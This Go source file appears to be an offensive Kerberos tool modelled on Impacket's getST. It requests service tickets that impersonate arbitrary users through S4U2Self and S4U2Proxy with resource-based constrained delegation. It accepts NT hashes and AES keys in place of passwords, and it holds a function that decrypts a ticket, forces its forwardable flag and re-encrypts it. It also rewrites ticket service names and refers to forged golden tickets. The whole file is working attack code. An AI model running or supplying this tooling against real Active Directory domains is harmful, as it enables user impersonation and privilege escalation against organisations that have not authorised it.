package kerberos

import (
	"encoding/asn1"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"

	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/credentials"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana"
	"github.com/jcmturner/gokrb5/v8/iana/flags"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/iana/msgtype"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/iana/patype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// STRequest holds configuration for a service ticket request.
type STRequest struct {
	Username         string
	Password         string
	Domain           string
	NTHash           string
	AESKey           string
	DCIP             string
	DCHost           string
	SPN              string // Target service SPN
	Impersonate      string // User to impersonate (S4U2Self)
	AdditionalTicket string // Path to additional ticket ccache (S4U2Proxy with RBCD)
	AltService       string // Alternative service name to set in ticket
	SelfOnly         bool   // Only do S4U2Self, skip S4U2Proxy (-self)
	ForceForwardable bool   // Force forwardable flag in S4U2Self ticket
	U2U              bool   // User-to-User
	Renew            bool   // Renew TGT
}

// STResult holds the result of a service ticket request.
type STResult struct {
	Ticket     []byte
	SessionKey types.EncryptionKey
	CName      types.PrincipalName
	SName      types.PrincipalName
	Realm      string
	AuthTime   time.Time
	EndTime    time.Time
	RenewTill  time.Time
	Flags      uint32
}

// GetST requests a service ticket and returns the result.
func GetST(req *STRequest) (*STResult, error) {
	realm := strings.ToUpper(req.Domain)

	// Build kerberos config
	cfg := config.New()
	cfg.LibDefaults.DefaultRealm = realm
	cfg.LibDefaults.DefaultTktEnctypes = []string{"aes256-cts-hmac-sha1-96", "aes128-cts-hmac-sha1-96", "rc4-hmac"}
	cfg.LibDefaults.DefaultTktEnctypeIDs = []int32{18, 17, 23}
	cfg.LibDefaults.DefaultTGSEnctypes = []string{"aes256-cts-hmac-sha1-96", "aes128-cts-hmac-sha1-96", "rc4-hmac"}
	cfg.LibDefaults.DefaultTGSEnctypeIDs = []int32{18, 17, 23}
	cfg.LibDefaults.PermittedEnctypes = []string{"aes256-cts-hmac-sha1-96", "aes128-cts-hmac-sha1-96", "rc4-hmac"}
	cfg.LibDefaults.PermittedEnctypeIDs = []int32{18, 17, 23}

	kdcHost := req.DCIP
	if kdcHost == "" {
		kdcHost = req.DCHost
	}
	if kdcHost == "" {
		kdcHost = req.Domain
	}

	// Step 1: Get TGT (from ccache or by authenticating)
	tgt, tgtSessionKey, err := loadOrRequestTGT(req, cfg, realm, kdcHost)
	if err != nil {
		return nil, fmt.Errorf("failed to get TGT: %v", err)
	}

	// Step 2: Request service ticket
	if req.Impersonate == "" {
		// Normal TGS-REQ
		return doTGSReq(tgt, tgtSessionKey, req, cfg, realm, kdcHost)
	}

	// S4U2Self (+ optional S4U2Proxy)
	return doS4U(tgt, tgtSessionKey, req, cfg, realm, kdcHost)
}

// loadOrRequestTGT loads a TGT from ccache or requests one from the KDC.
func loadOrRequestTGT(req *STRequest, cfg *config.Config, realm, kdcHost string) (messages.Ticket, types.EncryptionKey, error) {
	// Try loading from ccache
	ccachePath := os.Getenv("KRB5CCNAME")
	if ccachePath != "" {
		ccachePath = strings.TrimPrefix(ccachePath, "FILE:")
	}

	if ccachePath != "" {
		ccache, err := credentials.LoadCCache(ccachePath)
		if err == nil {
			// Look for TGT in ccache
			tgtSPN := fmt.Sprintf("krbtgt/%s", realm)
			sname := types.NewPrincipalName(nametype.KRB_NT_SRV_INST, tgtSPN)
			entry, ok := ccache.GetEntry(sname)
			if ok {
				var ticket messages.Ticket
				if err := ticket.Unmarshal(entry.Ticket); err == nil {
					sessionKey := entry.Key
					return ticket, sessionKey, nil
				}
			}
		}
	}

	// No ccache or no TGT found - request one
	tgtReq := &TGTRequest{
		Username: req.Username,
		Password: req.Password,
		Domain:   req.Domain,
		NTHash:   req.NTHash,
		AESKey:   req.AESKey,
		DCIP:     req.DCIP,
		DCHost:   req.DCHost,
	}

	result, err := GetTGT(tgtReq)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, err
	}

	// Unmarshal the ticket
	var ticket messages.Ticket
	if err := ticket.Unmarshal(result.Ticket); err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("failed to unmarshal TGT: %v", err)
	}

	return ticket, result.SessionKey, nil
}

// doTGSReq performs a normal TGS-REQ for a service ticket.
func doTGSReq(tgt messages.Ticket, sessionKey types.EncryptionKey, req *STRequest, cfg *config.Config, realm, kdcHost string) (*STResult, error) {
	cName := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, req.Username)
	sName := types.NewPrincipalName(nametype.KRB_NT_SRV_INST, req.SPN)

	tgsReq, err := messages.NewTGSReq(cName, realm, cfg, tgt, sessionKey, sName, req.Renew)
	if err != nil {
		return nil, fmt.Errorf("failed to create TGS-REQ: %v", err)
	}

	// Marshal and send
	b, err := tgsReq.Marshal()
	if err != nil {
		return nil, fmt.Errorf("failed to marshal TGS-REQ: %v", err)
	}

	respBuf, err := sendKDCRequest(kdcHost, b)
	if err != nil {
		return nil, err
	}

	// Parse TGS-REP
	return parseTGSRep(respBuf, sessionKey, sName, realm)
}

// doS4U performs S4U2Self and optionally S4U2Proxy.
func doS4U(tgt messages.Ticket, sessionKey types.EncryptionKey, req *STRequest, cfg *config.Config, realm, kdcHost string) (*STResult, error) {
	// Step 1: S4U2Self - get a service ticket to ourselves on behalf of the impersonated user
	fmt.Printf("[*] Requesting S4U2self\n")

	s4uSelfTicket, s4uSessionKey, err := doS4U2Self(tgt, sessionKey, req, cfg, realm, kdcHost)
	if err != nil {
		return nil, fmt.Errorf("S4U2Self failed: %v", err)
	}

	if req.SelfOnly {
		// Return the S4U2Self ticket directly
		ticketBytes, err := s4uSelfTicket.Marshal()
		if err != nil {
			return nil, fmt.Errorf("failed to marshal S4U2Self ticket: %v", err)
		}

		sName := s4uSelfTicket.SName
		return &STResult{
			Ticket:     ticketBytes,
			SessionKey: s4uSessionKey,
			CName:      types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, req.Impersonate),
			SName:      sName,
			Realm:      realm,
			AuthTime:   time.Now().UTC(),
			EndTime:    time.Now().UTC().Add(10 * time.Hour),
			RenewTill:  time.Now().UTC().Add(7 * 24 * time.Hour),
			Flags:      0x50800000, // forwardable, proxiable, renewable, pre_authent
		}, nil
	}

	// Step 2: S4U2Proxy - use the S4U2Self ticket to get a ticket to the target service
	fmt.Printf("[*] Requesting S4U2Proxy\n")
	return doS4U2Proxy(tgt, sessionKey, s4uSelfTicket, req, cfg, realm, kdcHost)
}

// doS4U2Self performs the S4U2Self exchange.
func doS4U2Self(tgt messages.Ticket, sessionKey types.EncryptionKey, req *STRequest, cfg *config.Config, realm, kdcHost string) (messages.Ticket, types.EncryptionKey, error) {
	cName := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, req.Username)
	// S4U2Self: request a ticket to ourselves
	sName := types.NewPrincipalName(nametype.KRB_NT_UNKNOWN, req.Username)

	// Build body with correct flags for S4U2Self
	body := messages.KDCReqBody{
		KDCOptions: types.NewKrbFlags(),
		Realm:      realm,
		SName:      sName,
		Till:       time.Now().UTC().Add(time.Hour * 10),
		Nonce:      int(rand.Int31()),
		EType:      cfg.LibDefaults.DefaultTGSEnctypeIDs,
	}
	body.KDCOptions.Bytes = setKDCFlagBytes(flags.Forwardable, flags.Renewable, flags.Canonicalize)
	body.KDCOptions.BitLength = 32

	// Build PA-TGS-REQ (AP-REQ with authenticator containing body checksum)
	apReqBytes, err := buildPATGSReq(body, tgt, sessionKey, realm, cName)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, err
	}

	// Build PA-FOR-USER
	paForUser, err := buildPAForUser(req.Impersonate, realm, sessionKey)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("failed to build PA-FOR-USER: %v", err)
	}

	// Assemble TGS-REQ
	tgsReq := messages.TGSReq{
		KDCReqFields: messages.KDCReqFields{
			PVNO:    iana.PVNO,
			MsgType: msgtype.KRB_TGS_REQ,
			PAData: types.PADataSequence{
				types.PAData{
					PADataType:  patype.PA_TGS_REQ,
					PADataValue: apReqBytes,
				},
				paForUser,
			},
			ReqBody: body,
		},
	}

	// Marshal and send
	b, err := tgsReq.Marshal()
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("failed to marshal S4U2Self TGS-REQ: %v", err)
	}

	respBuf, err := sendKDCRequest(kdcHost, b)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, err
	}

	// Parse response
	var tgsRep messages.TGSRep
	if err := tgsRep.Unmarshal(respBuf); err != nil {
		var krbErr messages.KRBError
		if errErr := krbErr.Unmarshal(respBuf); errErr == nil {
			return messages.Ticket{}, types.EncryptionKey{}, translateKRBError(krbErr)
		}
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("failed to unmarshal TGS-REP: %v", err)
	}

	// Decrypt enc-part to get session key
	et, err := crypto.GetEtype(sessionKey.KeyType)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("unsupported etype: %v", err)
	}

	decrypted, err := et.DecryptMessage(sessionKey.KeyValue, tgsRep.EncPart.Cipher, 8)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("failed to decrypt TGS-REP: %v", err)
	}

	var encPart messages.EncKDCRepPart
	if err := encPart.Unmarshal(decrypted); err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("failed to parse TGS-REP enc part: %v", err)
	}

	// Optionally force forwardable flag
	if req.ForceForwardable {
		err = forceForwardable(&tgsRep.Ticket, req)
		if err != nil {
			return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("failed to force forwardable: %v", err)
		}
	}

	return tgsRep.Ticket, encPart.Key, nil
}

// buildPATGSReq constructs the PA-TGS-REQ (an AP-REQ with authenticator containing
// a checksum of the marshaled body). This ensures the checksum matches the final body.
func buildPATGSReq(body messages.KDCReqBody, tgt messages.Ticket, sessionKey types.EncryptionKey, realm string, cName types.PrincipalName) ([]byte, error) {
	bodyBytes, err := body.Marshal()
	if err != nil {
		return nil, fmt.Errorf("failed to marshal body: %v", err)
	}

	et, err := crypto.GetEtype(sessionKey.KeyType)
	if err != nil {
		return nil, fmt.Errorf("failed to get etype: %v", err)
	}

	cb, err := et.GetChecksumHash(sessionKey.KeyValue, bodyBytes, keyusage.TGS_REQ_PA_TGS_REQ_AP_REQ_AUTHENTICATOR_CHKSUM)
	if err != nil {
		return nil, fmt.Errorf("failed to compute body checksum: %v", err)
	}

	auth, err := types.NewAuthenticator(realm, cName)
	if err != nil {
		return nil, fmt.Errorf("failed to create authenticator: %v", err)
	}
	auth.Cksum = types.Checksum{
		CksumType: et.GetHashID(),
		Checksum:  cb,
	}

	apReq, err := messages.NewAPReq(tgt, sessionKey, auth)
	if err != nil {
		return nil, fmt.Errorf("failed to create AP-REQ: %v", err)
	}

	apReqBytes, err := apReq.Marshal()
	if err != nil {
		return nil, fmt.Errorf("failed to marshal AP-REQ: %v", err)
	}

	return apReqBytes, nil
}

// doS4U2Proxy performs the S4U2Proxy exchange.
// We build the TGS-REQ from scratch to ensure the authenticator body checksum
// matches the final body (with AdditionalTickets and correct KDCOptions).
func doS4U2Proxy(tgt messages.Ticket, sessionKey types.EncryptionKey, s4uTicket messages.Ticket, req *STRequest, cfg *config.Config, realm, kdcHost string) (*STResult, error) {
	cName := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, req.Username)
	sName := types.NewPrincipalName(nametype.KRB_NT_SRV_INST, req.SPN)

	// Build body FIRST with correct flags and additional tickets
	body := messages.KDCReqBody{
		KDCOptions:        types.NewKrbFlags(),
		Realm:             realm,
		SName:             sName,
		Till:              time.Now().UTC().Add(time.Hour * 10),
		Nonce:             int(rand.Int31()),
		EType:             cfg.LibDefaults.DefaultTGSEnctypeIDs,
		AdditionalTickets: []messages.Ticket{s4uTicket},
	}
	// cname-in-addl-tkt (bit 14) + forwardable + renewable + canonicalize
	body.KDCOptions.Bytes = setKDCFlagBytes(flags.Forwardable, flags.Renewable, flags.Canonicalize, 14)
	body.KDCOptions.BitLength = 32

	// Build PA-TGS-REQ (AP-REQ with authenticator containing body checksum)
	apReqBytes, err := buildPATGSReq(body, tgt, sessionKey, realm, cName)
	if err != nil {
		return nil, err
	}

	// Build PA-PAC-OPTIONS for resource-based constrained delegation
	paPacOpts := buildPAPacOptions()

	// Assemble TGS-REQ
	tgsReq := messages.TGSReq{
		KDCReqFields: messages.KDCReqFields{
			PVNO:    iana.PVNO,
			MsgType: msgtype.KRB_TGS_REQ,
			PAData: types.PADataSequence{
				types.PAData{
					PADataType:  patype.PA_TGS_REQ,
					PADataValue: apReqBytes,
				},
				paPacOpts,
			},
			ReqBody: body,
		},
	}

	// Marshal and send
	b, err := tgsReq.Marshal()
	if err != nil {
		return nil, fmt.Errorf("failed to marshal S4U2Proxy TGS-REQ: %v", err)
	}

	respBuf, err := sendKDCRequest(kdcHost, b)
	if err != nil {
		return nil, err
	}

	return parseTGSRep(respBuf, sessionKey, sName, realm)
}

// parseTGSRep parses a TGS-REP response and returns the result.
func parseTGSRep(respBuf []byte, sessionKey types.EncryptionKey, sName types.PrincipalName, realm string) (*STResult, error) {
	var tgsRep messages.TGSRep
	if err := tgsRep.Unmarshal(respBuf); err != nil {
		var krbErr messages.KRBError
		if errErr := krbErr.Unmarshal(respBuf); errErr == nil {
			return nil, translateKRBError(krbErr)
		}
		return nil, fmt.Errorf("failed to unmarshal TGS-REP: %v", err)
	}

	// Decrypt enc-part (key usage 8 for TGS-REP)
	et, err := crypto.GetEtype(sessionKey.KeyType)
	if err != nil {
		return nil, fmt.Errorf("unsupported etype: %v", err)
	}

	decrypted, err := et.DecryptMessage(sessionKey.KeyValue, tgsRep.EncPart.Cipher, 8)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt TGS-REP: %v", err)
	}

	var encPart messages.EncKDCRepPart
	if err := encPart.Unmarshal(decrypted); err != nil {
		return nil, fmt.Errorf("failed to parse TGS-REP enc part: %v", err)
	}

	ticketBytes, err := tgsRep.Ticket.Marshal()
	if err != nil {
		return nil, fmt.Errorf("failed to marshal service ticket: %v", err)
	}

	return &STResult{
		Ticket:     ticketBytes,
		SessionKey: encPart.Key,
		CName:      tgsRep.CName,
		SName:      sName,
		Realm:      realm,
		AuthTime:   encPart.AuthTime,
		EndTime:    encPart.EndTime,
		RenewTill:  encPart.RenewTill,
		Flags:      0x50800000, // forwardable, proxiable, renewable, pre_authent
	}, nil
}

// SaveST saves a service ticket result to a ccache file.
func SaveST(filename string, result *STResult) error {
	return saveToCCache(filename, result.Ticket, result.SessionKey,
		result.CName, result.Realm, result.SName,
		result.AuthTime, result.EndTime, result.RenewTill, result.Flags)
}

// AlterServiceName rewrites the SPN in a ticket (for -altservice).
func AlterServiceName(result *STResult, altService string) error {
	// Parse the alt service
	var newClass, newHost, newRealm string
	newRealm = result.Realm

	if strings.Contains(altService, "@") {
		parts := strings.SplitN(altService, "@", 2)
		newRealm = strings.ToUpper(parts[1])
		altService = parts[0]
	}

	if strings.Contains(altService, "/") {
		parts := strings.SplitN(altService, "/", 2)
		newClass = parts[0]
		newHost = parts[1]
	} else {
		// Just the service class, keep existing hostname
		newClass = altService
		if len(result.SName.NameString) > 1 {
			newHost = result.SName.NameString[1]
		}
	}

	// Unmarshal the ticket to modify it
	var ticket messages.Ticket
	if err := ticket.Unmarshal(result.Ticket); err != nil {
		return fmt.Errorf("failed to unmarshal ticket: %v", err)
	}

	// Modify the SName in the ticket
	ticket.SName = types.PrincipalName{
		NameType:   nametype.KRB_NT_SRV_INST,
		NameString: []string{newClass, newHost},
	}
	ticket.Realm = newRealm

	// Re-marshal
	ticketBytes, err := ticket.Marshal()
	if err != nil {
		return fmt.Errorf("failed to re-marshal ticket: %v", err)
	}

	result.Ticket = ticketBytes
	result.SName = ticket.SName
	result.Realm = newRealm

	fmt.Printf("[*] Changing service from %s to %s/%s@%s\n",
		strings.Join(result.SName.NameString, "/"),
		newClass, newHost, newRealm)

	return nil
}

// buildPAForUser creates the PA-FOR-USER pre-auth data for S4U2Self.
func buildPAForUser(impersonate, realm string, sessionKey types.EncryptionKey) (types.PAData, error) {
	// PA-FOR-USER-ENC structure (MS-SFU 2.2.1):
	// userName: PrincipalName
	// userRealm: Realm
	// cksum: Checksum (HMAC-MD5, key usage 17)
	// auth-package: KerberosString ("Kerberos")

	// Build the S4U byte array for checksum
	// Format: name-type (LE uint32) + username + realm + "Kerberos"
	nameType := make([]byte, 4)
	binary.LittleEndian.PutUint32(nameType, uint32(nametype.KRB_NT_PRINCIPAL))

	s4uBytes := append(nameType, []byte(impersonate)...)
	s4uBytes = append(s4uBytes, []byte(realm)...)
	s4uBytes = append(s4uBytes, []byte("Kerberos")...)

	// Compute checksum using gokrb5's crypto
	et, err := crypto.GetEtype(sessionKey.KeyType)
	if err != nil {
		return types.PAData{}, fmt.Errorf("failed to get etype: %v", err)
	}
	checksum, err := et.GetChecksumHash(sessionKey.KeyValue, s4uBytes, 17)
	if err != nil {
		return types.PAData{}, fmt.Errorf("failed to compute PA-FOR-USER checksum: %v", err)
	}

	// Build the ASN.1 structure for PA-FOR-USER-ENC
	// This is a SEQUENCE with:
	//   [0] PrincipalName (userName)
	//   [1] GeneralString (userRealm)
	//   [2] Checksum (cksum)
	//   [3] GeneralString (auth-package)
	paForUser := paForUserEnc{
		UserName: types.PrincipalName{
			NameType:   nametype.KRB_NT_PRINCIPAL,
			NameString: []string{impersonate},
		},
		UserRealm:   realm,
		CksumType:   -138, // HMAC-MD5 checksum type
		CksumValue:  checksum,
		AuthPackage: "Kerberos",
	}

	encoded, err := marshalPAForUser(paForUser)
	if err != nil {
		return types.PAData{}, fmt.Errorf("failed to marshal PA-FOR-USER: %v", err)
	}

	return types.PAData{
		PADataType:  patype.PA_FOR_USER,
		PADataValue: encoded,
	}, nil
}

// paForUserEnc represents the PA-FOR-USER-ENC structure.
type paForUserEnc struct {
	UserName    types.PrincipalName
	UserRealm   string
	CksumType   int32
	CksumValue  []byte
	AuthPackage string
}

// marshalPAForUser manually encodes the PA-FOR-USER-ENC ASN.1 structure.
func marshalPAForUser(p paForUserEnc) ([]byte, error) {
	// PrincipalName: SEQUENCE { [0] INTEGER (name-type), [1] SEQUENCE OF GeneralString (name-string) }
	nameTypeBytes, err := asn1.Marshal(p.UserName.NameType)
	if err != nil {
		return nil, err
	}
	nameTypeExplicit, err := asn1.Marshal(asn1.RawValue{Class: asn1.ClassContextSpecific, Tag: 0, IsCompound: true, Bytes: nameTypeBytes})
	if err != nil {
		return nil, err
	}

	// Name strings - must use GeneralString (tag 0x1b), not PrintableString
	var nameStringsContent []byte
	for _, s := range p.UserName.NameString {
		nameStringsContent = append(nameStringsContent, marshalGeneralString(s)...)
	}
	// Wrap in SEQUENCE OF
	nameSeqBytes, err := asn1.Marshal(asn1.RawValue{Class: asn1.ClassUniversal, Tag: asn1.TagSequence, IsCompound: true, Bytes: nameStringsContent})
	if err != nil {
		return nil, err
	}
	nameSeqExplicit, err := asn1.Marshal(asn1.RawValue{Class: asn1.ClassContextSpecific, Tag: 1, IsCompound: true, Bytes: nameSeqBytes})
	if err != nil {
		return nil, err
	}

	principalNameContent := appendASN1Sequence(nameTypeExplicit, nameSeqExplicit)
	principalName, err := asn1.Marshal(asn1.RawValue{Class: asn1.ClassUniversal, Tag: asn1.TagSequence, IsCompound: true, Bytes: principalNameContent})
	if err != nil {
		return nil, err
	}
	userNameField, err := asn1.Marshal(asn1.RawValue{Class: asn1.ClassContextSpecific, Tag: 0, IsCompound: true, Bytes: principalName})
	if err != nil {
		return nil, err
	}

	// UserRealm [1] GeneralString
	realmBytes := marshalGeneralString(p.UserRealm)
	userRealmField, err := asn1.Marshal(asn1.RawValue{Class: asn1.ClassContextSpecific, Tag: 1, IsCompound: true, Bytes: realmBytes})
	if err != nil {
		return nil, err
	}

	// Checksum [2] SEQUENCE { [0] INTEGER, [1] OCTET STRING }
	cksumTypeBytes, err := asn1.Marshal(p.CksumType)
	if err != nil {
		return nil, err
	}
	cksumTypeField, err := asn1.Marshal(asn1.RawValue{Class: asn1.ClassContextSpecific, Tag: 0, IsCompound: true, Bytes: cksumTypeBytes})
	if err != nil {
		return nil, err
	}
	cksumValueBytes, err := asn1.Marshal(p.CksumValue)
	if err != nil {
		return nil, err
	}
	cksumValueField, err := asn1.Marshal(asn1.RawValue{Class: asn1.ClassContextSpecific, Tag: 1, IsCompound: true, Bytes: cksumValueBytes})
	if err != nil {
		return nil, err
	}
	cksumSeqContent := appendASN1Sequence(cksumTypeField, cksumValueField)
	cksumSeq, err := asn1.Marshal(asn1.RawValue{Class: asn1.ClassUniversal, Tag: asn1.TagSequence, IsCompound: true, Bytes: cksumSeqContent})
	if err != nil {
		return nil, err
	}
	cksumField, err := asn1.Marshal(asn1.RawValue{Class: asn1.ClassContextSpecific, Tag: 2, IsCompound: true, Bytes: cksumSeq})
	if err != nil {
		return nil, err
	}

	// AuthPackage [3] GeneralString
	authPkgBytes := marshalGeneralString(p.AuthPackage)
	authPkgField, err := asn1.Marshal(asn1.RawValue{Class: asn1.ClassContextSpecific, Tag: 3, IsCompound: true, Bytes: authPkgBytes})
	if err != nil {
		return nil, err
	}

	// Final SEQUENCE
	seqContent := append(userNameField, userRealmField...)
	seqContent = append(seqContent, cksumField...)
	seqContent = append(seqContent, authPkgField...)

	return asn1.Marshal(asn1.RawValue{Class: asn1.ClassUniversal, Tag: asn1.TagSequence, IsCompound: true, Bytes: seqContent})
}

// marshalGeneralString encodes a string as ASN.1 GeneralString (tag 27/0x1b).
func marshalGeneralString(s string) []byte {
	b, _ := asn1.Marshal(asn1.RawValue{
		Class: asn1.ClassUniversal,
		Tag:   27, // GeneralString
		Bytes: []byte(s),
	})
	return b
}

// appendASN1Sequence joins ASN.1 encoded items into raw content bytes.
func appendASN1Sequence(items ...[]byte) []byte {
	var content []byte
	for _, item := range items {
		content = append(content, item...)
	}
	return content
}

// buildPAPacOptions creates PA-PAC-OPTIONS for resource-based constrained delegation.
func buildPAPacOptions() types.PAData {
	// PA-PAC-OPTIONS flags: resource-based-constrained-delegation (bit 3)
	// Encoded as a BIT STRING with the RBCD flag set
	flags := asn1.BitString{
		Bytes:     []byte{0x10, 0x00, 0x00, 0x00}, // bit 3 set (resource-based-constrained-delegation)
		BitLength: 32,
	}

	// PA-PAC-OPTIONS ::= SEQUENCE { flags [0] KerberosFlags }
	flagsBytes, _ := asn1.Marshal(flags)
	flagsField, _ := asn1.Marshal(asn1.RawValue{Class: asn1.ClassContextSpecific, Tag: 0, IsCompound: true, Bytes: flagsBytes})
	seqBytes, _ := asn1.Marshal(asn1.RawValue{Class: asn1.ClassUniversal, Tag: asn1.TagSequence, IsCompound: true, Bytes: flagsField})

	return types.PAData{
		PADataType:  167, // PA-PAC-OPTIONS
		PADataValue: seqBytes,
	}
}

// forceForwardable decrypts the S4U2Self ticket and sets the forwardable flag.
func forceForwardable(ticket *messages.Ticket, req *STRequest) error {
	// Determine the key to decrypt the ticket (encrypted with our own key)
	var key []byte
	var encType int32

	if req.AESKey != "" {
		keyBytes, err := hex.DecodeString(req.AESKey)
		if err != nil {
			return fmt.Errorf("invalid AES key: %v", err)
		}
		switch len(keyBytes) {
		case 32:
			encType = 18
		case 16:
			encType = 17
		}
		key = keyBytes
	} else if req.NTHash != "" {
		hashStr := req.NTHash
		if strings.Contains(hashStr, ":") {
			parts := strings.Split(hashStr, ":")
			hashStr = parts[len(parts)-1]
		}
		var err error
		key, err = hex.DecodeString(hashStr)
		if err != nil {
			return fmt.Errorf("invalid NT hash: %v", err)
		}
		encType = 23
	} else if req.Password != "" {
		key = ntHash(req.Password)
		encType = 23
	} else {
		return fmt.Errorf("need password, hash, or aesKey to force forwardable")
	}

	// Use the ticket's actual etype if different
	if ticket.EncPart.EType != 0 {
		encType = ticket.EncPart.EType
	}

	et, err := crypto.GetEtype(encType)
	if err != nil {
		return fmt.Errorf("unsupported etype %d: %v", encType, err)
	}

	// Decrypt (key usage 2 = ticket encryption)
	decrypted, err := et.DecryptMessage(key, ticket.EncPart.Cipher, 2)
	if err != nil {
		return fmt.Errorf("failed to decrypt ticket: %v", err)
	}

	// Parse EncTicketPart
	var encTicket messages.EncTicketPart
	if err := encTicket.Unmarshal(decrypted); err != nil {
		return fmt.Errorf("failed to parse EncTicketPart: %v", err)
	}

	// Set forwardable flag (bit 1)
	fmt.Printf("[*] Forcing the service ticket to be forwardable\n")
	if len(encTicket.Flags.Bytes) > 0 {
		encTicket.Flags.Bytes[0] |= 0x40 // bit 1 (forwardable) in first byte
	}

	// Re-encode and re-encrypt
	encTicketBytes, err := asn1.Marshal(encTicket)
	if err != nil {
		return fmt.Errorf("failed to re-marshal EncTicketPart: %v", err)
	}

	_, newCipher, err := et.EncryptMessage(key, encTicketBytes, 2)
	if err != nil {
		return fmt.Errorf("failed to re-encrypt ticket: %v", err)
	}

	ticket.EncPart.Cipher = newCipher
	return nil
}


// setKDCFlagBytes sets specific bit positions in a 4-byte KDC options field.
func setKDCFlagBytes(positions ...int) []byte {
	opts := make([]byte, 4)
	for _, pos := range positions {
		byteIdx := pos / 8
		bitIdx := uint(7 - (pos % 8))
		if byteIdx < len(opts) {
			opts[byteIdx] |= 1 << bitIdx
		}
	}
	return opts
}

// RequestTGS requests a service ticket using a pre-existing TGT.
// This is used for cross-realm referrals (e.g., forged golden ticket -> inter-realm TGT).
func RequestTGS(tgtBytes []byte, sessionKey types.EncryptionKey,
	spn, username, realm, kdcHost string) (*STResult, error) {

	// Unmarshal the TGT
	var tgt messages.Ticket
	if err := tgt.Unmarshal(tgtBytes); err != nil {
		return nil, fmt.Errorf("failed to unmarshal TGT: %v", err)
	}

	// Build minimal config
	cfg := config.New()
	cfg.LibDefaults.DefaultRealm = realm
	cfg.LibDefaults.DefaultTGSEnctypes = []string{"aes256-cts-hmac-sha1-96", "aes128-cts-hmac-sha1-96", "rc4-hmac"}
	cfg.LibDefaults.DefaultTGSEnctypeIDs = []int32{18, 17, 23}

	req := &STRequest{
		Username: username,
		Domain:   strings.ToLower(realm),
		SPN:      spn,
	}

	return doTGSReq(tgt, sessionKey, req, cfg, realm, kdcHost)
}

// LoadAdditionalTicket loads a service ticket from a ccache file for S4U2Proxy with RBCD.
func LoadAdditionalTicket(path string) (messages.Ticket, error) {
	path = strings.TrimPrefix(path, "FILE:")

	ccache, err := credentials.LoadCCache(path)
	if err != nil {
		return messages.Ticket{}, fmt.Errorf("failed to load ccache %s: %v", path, err)
	}

	// Get the first credential entry
	if len(ccache.Credentials) == 0 {
		return messages.Ticket{}, fmt.Errorf("no credentials in ccache %s", path)
	}

	entry := ccache.Credentials[0]
	var ticket messages.Ticket
	if err := ticket.Unmarshal(entry.Ticket); err != nil {
		return messages.Ticket{}, fmt.Errorf("failed to unmarshal ticket from ccache: %v", err)
	}

	return ticket, nil
}

// EncKeyFromTicketResult builds a types.EncryptionKey from a TicketResult's session key.
func EncKeyFromTicketResult(tr *TicketResult) types.EncryptionKey {
	return types.EncryptionKey{
		KeyType:  tr.EncType,
		KeyValue: tr.SessionKey,
	}
}

// MakePrincipalName creates a types.PrincipalName (exposed for external use).
func MakePrincipalName(nameType int32, name string) types.PrincipalName {
	return types.NewPrincipalName(nameType, name)
}
